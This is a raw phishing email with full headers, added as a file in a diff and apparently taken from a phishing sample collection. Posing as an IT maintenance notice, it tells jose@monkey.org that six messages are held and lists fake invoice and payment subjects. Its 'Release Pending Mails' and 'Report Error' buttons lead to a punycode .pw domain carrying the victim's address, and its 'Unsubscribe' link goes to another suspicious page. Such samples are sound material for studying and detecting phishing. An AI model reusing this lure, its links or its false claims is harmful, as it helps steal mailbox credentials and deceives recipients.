@@ -1,0 +1,249 @@
+Return-Path: anya@johnslavin.com
+Delivered-To: jose@monkey.org
+X-FDA: 82620555402.03.D10C498
+Received: from sleek.johnslavin.com (sleek.johnslavin.com [193.25.216.189])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 472CA1A0003
+	for <jose@monkey.org>; Mon, 30 Sep 2024 07:19:59 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;	dkim=pass
+ header.d=johnslavin.com header.s=dkim header.b=TheitkjW;	spf=pass
+ (imf01.b.hostedemail.com: domain of anya@johnslavin.com designates
+ 193.25.216.189 as permitted sender) smtp.mailfrom=anya@johnslavin.com;
+	dmarc=pass (policy=none) header.from=johnslavin.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1727680719;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=zxwGgHperdTUzrtAaeo/wiHSC2ntsXfzAE+4Q2SgQI4=;
+	b=dvHm3jUjat9RE4eiwA6GuMi5kv68VfZ0QrwEZmcgQ6VAnDPsNU+0PW4vVSXYJK35F/nAES
+	pFWjR5CNEYKSy5v773So0IdB8cg+Tx8D97dtCJ32SalOrXezKoo7qPaMRmi12HQKV72NPn
+	segDTO5GQT2/pUNwROLR9Dc0WXv4sB4=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1727680719; a=rsa-sha256;
+	cv=none;
+	b=csYJLJpaXCpCXot9oPGE191tQad2SFGAp6yuQBuWduC0UpyFt+4iWxjDe3a/yYecSvl1kT
+	D4CsY1cgLKoeQyBPzpN/qZgM/FDb1MzIs7lOA2b64wMYec4z5rm5FrKO2kmQIWLT/0GWOs
+	cY1W7Frrao04IN5N8bDdF0WPz6iwaeE=
+ARC-Authentication-Results: i=1;	imf01.b.hostedemail.com;	dkim=pass
+ header.d=johnslavin.com header.s=dkim header.b=TheitkjW;	spf=pass
+ (imf01.b.hostedemail.com: domain of anya@johnslavin.com designates
+ 193.25.216.189 as permitted sender) smtp.mailfrom=anya@johnslavin.com;
+	dmarc=pass (policy=none) header.from=johnslavin.com
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=johnslavin.com; 
+ =?utf-8?q?h=3DFrom=3ATo=3ASubject=3ADate=3AMessage-ID=3AMIME-Version=3ACont?=
+ =?utf-8?q?ent-Type=3AContent-Transfer-Encoding=3B?= i=anya@johnslavin.com;
+ bh=TEdKYUoX7Pguqtqy2xthMqmYAQ8=; =?utf-8?q?b=3DTheitkjWGQZ1kMuVqHRNcaARzd0v?=
+ =?utf-8?q?x7rWZJhl4KQIRhrMIHjp3uEVpwtr4UBUjAoJe5SIthxrERkA?=  
+ Sfjr+knKp6N4NGoClcfSi2GvhSNKtq1zqG4imixiUR72OmssU/Zalvd6SUHNl8RUN7Ru2OhCVvRm
+  
+ 2IWO8fjrmMyzb2eNWknrEaFUqZQLs62xJHIaPjvtQt9b5oBs+iAmtVRYoP155GePth6OBrQ7KmyN
+  
+ wjkYre0W4Tyih5QOzQy1GJA+roA/L8yv3BXgaXcxsocOV+AgGKUK5dZPPXsi/mrInCMbooOdnKcx
+   F4/HBCsNdoUJFV1f6eESgm+k+94xv6wRyyKKCQ==
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=johnslavin.com; 
+ =?utf-8?q?b=3DP7zZiLsgqm9+GW7C4WkaNgByTWmAh0PG4c9WYOV/69k6lxKGOL+H59vk8DEXk?=
+ =?utf-8?q?sklbedOu2hBqUM0?=  
+ uMvcdL9t+LAz5UPz939nu23GWi0GzfyUK1Rwf3s/GSpaF7zvs1QLnhL0x0QWH5MMK4kcuJjW5amE
+  
+ X5RYjHdXMWVob1OzPECsjErZ5UWEtk0HhELIUS4VQw0gYkq90sm4/Pb0jzpMEswr0l0Fabd5cfP9
+  
+ munByc39rjy6j4a4gE83ebXeRTUEOotHuj0Wd1OPBtBrQ8Ika6eNhhtXyRbLuJSONt9GMn7d+Z84
+   P8GWYMLb9jYvkyyfg43cbTRb58D6XSk4y82NOw==;
+From: ITMaintenance<anya@johnslavin.com>
+To: jose@monkey.org
+Subject: Error synchronizing message 
+Date: 30 Sep 2024 00:19:58 -0700
+Message-ID: <20240930001957.1F3AE6883947D620@johnslavin.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Server: rspam04
+X-Rspamd-Queue-Id: 472CA1A0003
+X-Stat-Signature: msqxq4dsczc57wppsx9cpyxwtkoh6rrr
+X-Spam-Status: No, score=0.97
+X-HE-Tag: 1727680799-159477
+X-HE-Meta: =?utf-8?q?U2FsdGVkX1/XtWZvntjS437Wth+a2X1DYEgp55zgzeNYmKGlldFVShj?=
+ =?utf-8?q?XkHtXlSIoCMfGIOzswG9rtYq5CLYVqvripsXc3tf52/Mxnk0UdqAlQtP2goVr7V7V?=
+ =?utf-8?q?HiYQtOAMLAAgcd6APCpYlAybgryXzQ0SaOy6B8/iBHaq2hWfb/oC/xDsRts39Kzyy?=
+ =?utf-8?q?VuKeN8SzXyj91p8a5gmC94xSbI3yMahvDJRHvapjAvyqxV1E6dQKBS9OBY/oO+T2G?=
+ =?utf-8?q?AfPqKUpP3Y6SBY6MlDEZajVvqKhEFfvvhI6FNbbQ2cm1WxOJn3FLGOkop1RuMYKot?=
+ =?utf-8?q?6oT9nWOxBIERzG5wfaRr4fY98flr/avpLI/UEwDeLTXvfjMK9fY76WjKaumInqBVK?=
+ =?utf-8?q?FTjggyNItzVkqQASdSA8J4CgOmthhZtQxL65cphMmJAmeQN7HuNYp3vcJKP4gpslk?=
+ =?utf-8?q?n/ED4fS6K6Nb2LWqHF831WcmMk1hWuqVN2X+9a4WJkfvO+UTOMn0YnCVRKR3tA5vq?=
+ =?utf-8?q?jKeUNwkHhfXg02HUIkhUipfKKz4uaNQCR8xr0oKItr6p7UbNigeqf9FczYUYQGVfe?=
+ =?utf-8?q?ScnDQ5oJJOUGO3/jJVc1P4dhnil/Kt05C+LJcoPe08KyetLAxCP1U5YCsb1Eh4vVq?=
+ =?utf-8?q?/flh3lUUm60apCUSuoh8dbZhbhAA4viD2uw3aZG/qa+sp9qosSj09ou99THgNRYcC?=
+ =?utf-8?q?Qv1E4eRY76sJTjjQr+Bf7LTFu3xHdZF+U6FlFqpX0HNTMOTx3caN2W2XWBqbYNIBq?=
+ =?utf-8?q?RCMCKKyZpvm2DCfpIiGrT6vtZ1opJCbNWmLkNDmtdX81SQMbZvKt9VybaGdj6/7V9?=
+ =?utf-8?q?BzWGKgBG+/LbikCIBTWLEYHVFegOCmfEhFCLqVK2HUznLyfuMT7818HE8b1XqGAYv?=
+ =?utf-8?q?N5svFNON1OeF8v9/QOPzjl/DH1MeZqbbrZkGKinvfCMuSw6HJAFVu5B0LNqoKcju6?=
+ =?utf-8?q?d8f9ETopva6B4zGlJ9pCrd_K6Sbd+uznh/AaS10R/XsOl0eIuQh1v6a858sZN4t8k?=
+ =?utf-8?q?k8qAsBOiTnwT7RKmTzPCj7x5KXObW+EP3nXxvRPdhswXj7xPD5Bi0zmxdKEq2Qabe?=
+ =?utf-8?q?9hg/oxYe+FAKM/Cp4UvV8PY0AvlSD9plJ40B1lFLRjzgx2EemC1lcuxrArYiYtSjw?=
+ =?utf-8?q?fZ/f7VKyAowBIAhM7OMTigTm3tEaCrGSwk2h2tSgnOHR7uB8I7jwsNGLZBFEhkwLq?=
+ =?utf-8?q?CVc=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 278
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<div style=3D"text-align: left; color: rgb(34, 34, 34); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica,=
+ sans-serif; font-size: 14px; font-style: normal; font-weight: 400; word-sp=
+acing: 0px; white-space: normal; box-sizing: border-box; orphans: 2; widows=
+: 2; background-color: rgb(255, 255, 255); font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;"><table style=3D"width: 700px; height: 208p=
+x; color: rgb(0, 0, 0); font-size: 15px; border-collapse: collapse; box-siz=
+ing: border-box;" border=3D"0" cellspacing=3D"2" cellpadding=3D"2"><tbody s=
+tyle=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td =
+style=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: borde=
+r-box; background-color: rgb(243, 255, 248);"><strong>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;</strong>
+<div style=3D"width: 700px; text-align: left; color: rgb(0, 0, 0); text-tra=
+nsform: none; text-indent: 0px; letter-spacing: normal; font-family: Roboto=
+, Tahoma, Helvetica, sans-serif; font-size: 12px; font-style: normal; font-=
+weight: 400; word-spacing: 0px; white-space: normal; box-sizing: border-box=
+; orphans: 2; widows: 2; background-color: rgba(241, 243, 244, 0.5); font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;">You have s=
+ix messages still pending to be delivered to your inbox since Monday,&nbsp;=
+September 28, 2024.<br style=3D"box-sizing: border-box;"><br style=3D"box-s=
+izing: border-box;"><strong style=3D"font-weight: bolder; box-sizing: borde=
+r-box;">Mailbox:<span>&nbsp;jose@monkey.org</span></strong><br style=3D"box=
+-sizing: border-box;"></div></td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(243, 255, 248);"><strong style=3D"font-wei=
+ght: bolder; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Recipient</stron=
+g></td><td style=3D"margin: 0px; width: 150px; font-family: Calibri; box-si=
+zing: border-box; background-color: rgb(243, 255, 248);"><strong style=3D"f=
+ont-weight: bolder; box-sizing: border-box;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;Date</strong></td></tr><tr style=3D"box-sizing: border-box;"><td s=
+tyle=3D"margin: 0px; width: 340px; font-family: Calibri; box-sizing: border=
+-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888;&#65039; FW=
+: Invoice copy AWB No. 325-2322</td><td style=3D"margin: 0px; width: 230px;=
+ font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 2=
+04, 255);">&nbsp;&nbsp;&nbsp;&nbsp;To :<span>
+&nbsp;jose@monkey.org</span></td><td style=3D"margin: 0px; width: 150px; fo=
+nt-family: Calibri; box-sizing: border-box; background-color: rgb(204, 204,=
+ 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;28/09/2024 10:51:07 AM</td></tr><tr s=
+tyle=3D"box-sizing: border-box;"><td style=3D"margin: 0px; width: 340px; fo=
+nt-family: Calibri; box-sizing: border-box; background-color: rgb(204, 204,=
+ 255);">&nbsp;&nbsp;&#9888;&#65039; Updated Sea Freight Quotation</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(204, 204, 255);"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;jose@m=
+onkey.org</span></font></font></td><td style=3D"margin: 0px; width: 150px; =
+font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 20=
+4, 255);">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;28/09/2024 11:09:02 AM</font></font></td></tr><tr style=3D"box-si=
+zing: border-box;"><td style=3D"margin: 0px; width: 340px; font-family: Cal=
+ibri; box-sizing: border-box; background-color: rgb(204, 204, 255);">&nbsp;=
+&nbsp;&#9888;&#65039; AW: PO#203477 INVOICES</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(204, 204, 255);"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;jose@m=
+onkey.org</span></font></font></td><td style=3D"margin: 0px; width: 150px; =
+font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 20=
+4, 255);">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;28/09/2024 1:51:14 PM</td></tr><tr style=3D"b=
+ox-sizing: border-box;"><td style=3D"margin: 0px; width: 340px; font-family=
+: Calibri; box-sizing: border-box; background-color: rgb(204, 204, 255);"><=
+font style=3D"vertical-align: inherit; box-sizing: border-box;"><font style=
+=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;&nbsp;&#9888;&#=
+65039; Re: Regarding the preparation of the 23/09/2024 plan by the start-up=
+ department</font></font></td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(204, 204, 255);"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;jose@m=
+onkey.org</span></font></font></td><td style=3D"margin: 0px; width: 150px; =
+font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 20=
+4, 255);">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;29/09/2024</font></font></td></tr><tr style=3D"box-sizing: border=
+-box;"><td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-si=
+zing: border-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888=
+;&#65039; Fwd: Payment ---- Forwarded message ----</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(204, 204, 255);"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;jose@m=
+onkey.org</span></font></font></td><td style=3D"margin: 0px; width: 150px; =
+font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 20=
+4, 255);">
+<font style=3D"vertical-align: inherit; box-sizing: border-box;"><font styl=
+e=3D"vertical-align: inherit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&n=
+bsp;&nbsp;29/09/2024</font></font></td></tr><tr style=3D"box-sizing: border=
+-box;"><td style=3D"margin: 0px; width: 340px; font-family: Calibri; box-si=
+zing: border-box; background-color: rgb(204, 204, 255);">&nbsp;&nbsp;&#9888=
+;&#65039; NEW VIRUS OUT BREAK</td>
+<td style=3D"margin: 0px; width: 230px; font-family: Calibri; box-sizing: b=
+order-box; background-color: rgb(204, 204, 255);"><font style=3D"vertical-a=
+lign: inherit; box-sizing: border-box;"><font style=3D"vertical-align: inhe=
+rit; box-sizing: border-box;">&nbsp;&nbsp;&nbsp;&nbsp;To:<span>&nbsp;jose@m=
+onkey.org</span></font></font></td><td style=3D"margin: 0px; width: 160px; =
+font-family: Calibri; box-sizing: border-box; background-color: rgb(204, 20=
+4, 255);"><span style=3D"box-sizing: border-box;">
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;29/09/2024</span></td></tr></tbody></table><d=
+iv style=3D"margin: 0px; box-sizing: border-box;">&nbsp;</div><ol style=3D"=
+padding: 30px; margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box=
+;"><li style=3D"box-sizing: border-box;">
+<a style=3D"background: rgb(80, 110, 216); padding: 10px; border-radius: 2p=
+x; color: rgb(255, 255, 255); text-decoration: none; box-sizing: border-box=
+;" href=3D"http://xn--8-gbu8kub2d5f1b8146cyrdh44c.pw/favicons.html#jose@mon=
+key.org" target=3D"_blank" rel=3D"noreferrer">Release Pending Mails to inbo=
+x</a><br style=3D"box-sizing: border-box;"><br style=3D"box-sizing: border-=
+box;"><br style=3D"box-sizing: border-box;"></li><li style=3D"box-sizing: b=
+order-box;">
+<a style=3D"background: rgb(212, 0, 0); padding: 10px; border-radius: 2px; =
+color: rgb(255, 255, 255); text-decoration: none; box-sizing: border-box;" =
+href=3D"http://xn--8-gbu8kub2d5f1b8146cyrdh44c.pw/favicons.html#jose@monkey=
+=2Eorg" target=3D"_blank" rel=3D"noreferrer">Report Error To IT Help Desk</=
+a></li></ol><div style=3D"margin: 0px; font-family: arial, helvetica, sans-=
+serif; box-sizing: border-box;"><br style=3D"box-sizing: border-box;"><br s=
+tyle=3D"box-sizing: border-box;">
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; box-sizing: border-box; font-variant-ligatures: normal; fon=
+t-variant-caps: normal; text-decoration-style: initial; text-decoration-col=
+or: initial;"><span style=3D"color: rgb(0, 0, 0); font-family: Calibri; fon=
+t-size: 14px; box-sizing: border-box;">
+You will receive pending emails after successful login via portal as we apo=
+logize for the inconvenience.</span></div></div><div style=3D"width: 700px;=
+ margin-top: 30px; box-sizing: border-box;"><hr style=3D"border-width: 1px =
+0px 0px; height: 0px; overflow: visible; margin-top: 1rem; margin-bottom: 1=
+rem; border-top-color: rgba(0, 0, 0, 0.1); border-top-style: solid; box-siz=
+ing: content-box;"></div>
+<div style=3D"color: rgb(131, 130, 130); line-height: 2; font-size: 10px; m=
+argin-top: 10px; box-sizing: border-box;"><em style=3D"box-sizing: border-b=
+ox;">Message Encrypted by<span style=3D"box-sizing: border-box;">&nbsp;monk=
+ey.org </span></em><em style=3D"box-sizing: border-box;">&copy; All Rights =
+Reserved.</em><span style=3D"box-sizing: border-box;">&nbsp;</span>| If you=
+ do not wish to recieve this message<span style=3D"box-sizing: border-box;"=
+>&nbsp;</span>
+<a style=3D"color: rgb(0, 172, 255); text-decoration: none; box-sizing: bor=
+der-box; background-color: transparent;" href=3D"https://nashishenme.hb.ru-=
+msk.vkcs.cloud/michaaaaaaaaaaaaaa%20%281%29.html#northern@clearcentral.com.=
+au" target=3D"_blank" rel=3D"noreferrer">Unsubscribe.</a></div></div></body=
+></html>
+
